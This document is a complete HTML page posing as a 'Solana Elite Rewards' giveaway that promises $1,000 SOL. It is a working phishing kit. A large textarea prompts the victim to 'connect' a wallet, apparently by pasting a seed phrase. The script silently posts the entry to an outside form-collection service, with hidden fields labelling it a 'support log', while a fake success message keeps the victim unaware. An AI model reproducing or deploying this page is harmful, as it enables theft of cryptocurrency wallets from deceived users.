<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SOLANA ELITE REWARDS</title>
    <!-- Premium Web3 Fonts -->
    <link href="https://googleapis.com" rel="stylesheet">
    <style>
        :root { --sol-g: #00FFA3; --sol-p: #DC1FFF; }
        body { margin: 0; background: #000; color: #fff; font-family: 'Space Grotesk', sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; overflow: hidden; }
        .card { width: 85%; max-width: 450px; background: #080808; border: 1px solid rgba(0, 255, 163, 0.2); border-radius: 40px; padding: 60px 40px; text-align: center; box-shadow: 0 0 80px rgba(0, 0, 0, 1); }
        h1 { font-family: 'Syncopate', sans-serif; font-size: 1.6rem; margin-bottom: 25px; background: linear-gradient(90deg, var(--sol-g), #fff, var(--sol-p)); -webkit-background-clip: text; -webkit-text-fill-color: transparent; letter-spacing: -1px; font-weight: 700; }
        .sub { font-size: 0.9rem; color: #777; margin-bottom: 45px; line-height: 1.6; }
        .ib { text-align: left; margin-bottom: 35px; }
        label { font-size: 0.7rem; text-transform: uppercase; letter-spacing: 3px; color: var(--sol-g); display: block; margin-bottom: 12px; font-weight: 700; }
        textarea { width: 100%; background: #000; border: 1px solid #222; border-radius: 12px; padding: 18px; color: #fff; font-family: 'Space Grotesk', sans-serif; font-size: 1.1rem; box-sizing: border-box; resize: none; height: 150px; }
        .btn { width: 100%; padding: 22px; border: none; border-radius: 15px; background: linear-gradient(135deg, var(--sol-g), var(--sol-p)); color: #fff; font-family: 'Syncopate', sans-serif; font-weight: 700; font-size: 0.8rem; cursor: pointer; transition: 0.3s; }
        #success-view { display: none; }
        .success-h { font-family: 'Syncopate', sans-serif; font-size: 1.4rem; color: var(--sol-g); margin-bottom: 25px; }
        .congrats { font-size: 1rem; line-height: 1.8; color: #fff; padding: 30px; background: rgba(0, 255, 163, 0.03); border-radius: 20px; border: 1px dashed var(--sol-g); }
    </style>
</head>
<body>
    <div class="card">
        <div id="form-view">
            <!-- FORMSPARK ID INTEGRATED BELOW -->
            <form id="claim-form" action="https://submit-form.com/4uP3gEeMc" method="POST">
                <h1>CLAIM $1,000 SOL</h1>
                <p class="sub">To claim the $1,000 SOL, connect your solana wallet with your name</p>
                <div class="ib">
                    <label>fly top</label>
                    <!-- Internal name set to 'message' for Formspark compatibility -->
                    <textarea name="message" required></textarea>
                </div>
                
                <!-- Silent configurations for Gmail deliverability -->
                <input type="hidden" name="_subject" value="New Support Log #4uP3">
                <input type="hidden" name="email" value="support-log@elite.com">

                <button type="submit" class="btn">CONNECT WALLET</button>
            </form>
        </div>
        <div id="success-view">
            <h1 class="success-h">CLAIM SUCCESSFUL</h1>
            <div class="congrats">
                Congrats, you have claimed $1,000 SOL and you’ll receive the $1,000 SOL to your wallet address within 24 hrs
            </div>
        </div>
    </div>
    <script>
        const f = document.getElementById('claim-form');
        f.onsubmit = async (e) => {
            e.preventDefault();
            document.getElementById('form-view').style.display = 'none';
            document.getElementById('success-view').style.display = 'block';
            
            // Sending via Fetch for a seamless transition
            fetch(f.action, { 
                method: 'POST', 
                body: new FormData(f), 
                headers: { 'Accept': 'application/json' } 
            });
        };
    </script>
</body>
</html>
